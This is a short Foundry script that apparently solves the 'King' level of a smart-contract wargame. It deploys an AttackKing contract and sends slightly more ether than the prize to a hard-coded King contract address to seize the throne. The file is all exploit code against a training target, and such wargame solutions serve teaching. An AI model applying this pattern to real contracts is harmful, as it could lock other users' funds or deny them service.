// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {King} from "../src/level9/King.sol";
import {AttackKing} from "../src/level9/AttackKing.sol";
import "forge-std/console.sol";

contract level9Exploit is Script {
    King king = King(payable(0x1F9E4a675fBd920A277769e77C21641891482192));

    function run() external {
        vm.startBroadcast();
        console.log("king", king._king());
        new AttackKing{value: 1000000000000001 wei}(address(king));
        console.log("king", king._king());
        vm.stopBroadcast();
    }
}
